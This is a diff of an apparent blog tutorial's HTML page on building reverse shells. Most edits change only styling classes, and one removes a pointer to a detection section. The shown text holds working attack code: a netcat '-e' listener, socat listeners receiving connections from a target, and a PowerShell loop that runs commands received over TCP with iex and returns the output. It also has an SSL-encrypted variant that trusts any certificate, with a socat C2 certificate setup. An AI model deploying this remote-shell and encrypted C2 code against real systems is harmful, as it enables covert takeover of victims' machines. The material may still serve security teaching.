@@ -241,10 +241,10 @@ Host: www.google.com
 
 <p>If we want to serve this program over the network we can use the -e for it.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lnvp 3333 -e ./sayhello 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lnvp 3333 -e ./sayhello 
 </code></pre></div></div>
 <p>And from another computer you can look for this service and receive the output of this program.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc localhost 3333                                                        
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc localhost 3333                                                        
 85 # Our input
 Hello # Remote output
 85 # Remote output
@@ -314,7 +314,7 @@ Hello # Remote output
 </code></pre></div></div>
 <p>This will open our 443 for multiple TCP connections and will print everything in our stdout, the <strong><em>-d</em></strong> is the debug level, so if you run the Powershell script command above, I will get something like that in our Linux:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
 2020/05/21 15:22:41 socat[1684] N listening on AF=2 0.0.0.0:443
 2020/05/21 15:22:43 socat[1684] N accepting connection from AF=2 172.16.110.131:1315 on AF=2 172.16.110.129:443
 2020/05/21 15:22:43 socat[1684] N forked off child process 1685
@@ -366,7 +366,7 @@ Hello # Remote output
 </span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
 </span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
 
-</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
 
 </span><span class="nf">Write-Host</span><span class="w"> </span><span class="nv">$buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"> </span><span class="c"># For debugging</span><span class="w">
 
@@ -384,7 +384,7 @@ Hello # Remote output
 </span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
 </span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
 
-</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
 
 </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
 
@@ -437,7 +437,7 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 </span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
 </span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
 
-</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
 
 </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
 
@@ -462,11 +462,11 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 </span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
 
 
-</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
+</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
     </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
     </span><span class="nv">$command_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">iex</span><span class="w"> </span><span class="nv">$command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w"> </span><span class="c"># Invoke-Expression shorten</span><span class="w">
     </span><span class="nv">$command_back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetBytes</span><span class="p">(</span><span class="nv">$command_response</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_response</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
-    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
 </span><span class="p">}</span><span class="w">
 
 
@@ -501,7 +501,7 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 
 <p>Openssl command:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl req -newkey rsa:2048 -nodes -x509 -keyout my_priv_key.pem -out my_cert.cert
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl req -newkey rsa:2048 -nodes -x509 -keyout my_priv_key.pem -out my_cert.cert
 </code></pre></div></div>
 
 <ul>
@@ -515,7 +515,7 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 
 <p>After you run this, there will be a couple of questions about the certificate, you can hit enter in everything. There will be now two files a <strong><em>.pem</em></strong> file and a <strong><em>.cert</em></strong> file, let’s impersonate this .cert file with the utility x509 of openssl package:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl x509 -in my_cert.cert -text
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl x509 -in my_cert.cert -text
 </code></pre></div></div>
 
 <p><img src="https://aandersonl.github.io/assets/images/reverse_shell/openssl_text.png" alt="" /></p>
@@ -526,17 +526,17 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 
 <p>Now, as we have our certifcate and our private key generated, we can use SOCAT to listen for SSL connections using our cert file, socat expect that our private key be in the same file of our certficate (only for read porpuse of the software), so we need to concat everything inside another file, you can use cat for this:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat my_cert.cert my_priv_key.pem &gt; c2_cert.cert
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat my_cert.cert my_priv_key.pem &gt; c2_cert.cert
 </code></pre></div></div>
 
 <p>Now lets run socat with this certifcate:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ socat -d -d - OPENSSL-LISTEN:443,cert=c2_cert.cert,verify=0,fork 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ socat -d -d - OPENSSL-LISTEN:443,cert=c2_cert.cert,verify=0,fork 
 </code></pre></div></div>
 
 <p>Now we are ready to make encrypted connections, lets first use the same openssl tool for connect to our C2, just for debugging porpuse</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl s_client -connect 127.0.0.1:443
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl s_client -connect 127.0.0.1:443
 </code></pre></div></div>
 
 <p><img src="https://aandersonl.github.io/assets/images/reverse_shell/ssl_channel.png" alt="" /></p>
@@ -555,7 +555,7 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 
 <p>Note that we pass our current stream, false to leaveInnerStreamOpen(second argument), and a anonymous function that always return <strong><em>true</em></strong> in the certificate verification process and null to userCertificateSelectionCallback parameter.</p>
 
-<p>With this we have a fully encrypted channel between our target and the attacker, I will enter in the Network connection details in the <strong><em>Threat Analysis and Detection</em></strong> section!</p>
+<p>With this we have a fully encrypted channel between our target and the attacker.</p>
 
 <p>Reverse SSL Powershell code:</p>
 
@@ -571,11 +571,11 @@ now our <strong><em>$command</em></strong> variable holds the decoded string, if
 </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">AuthenticateAsClient</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span><span class="w">
 
 
-</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
+</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
     </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
     </span><span class="nv">$command_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">iex</span><span class="w"> </span><span class="nv">$command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w"> </span><span class="c"># Invoke-Expression shorten</span><span class="w">
     </span><span class="nv">$command_back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetBytes</span><span class="p">(</span><span class="nv">$command_response</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_response</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
-    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
 </span><span class="p">}</span><span class="w">
 
 
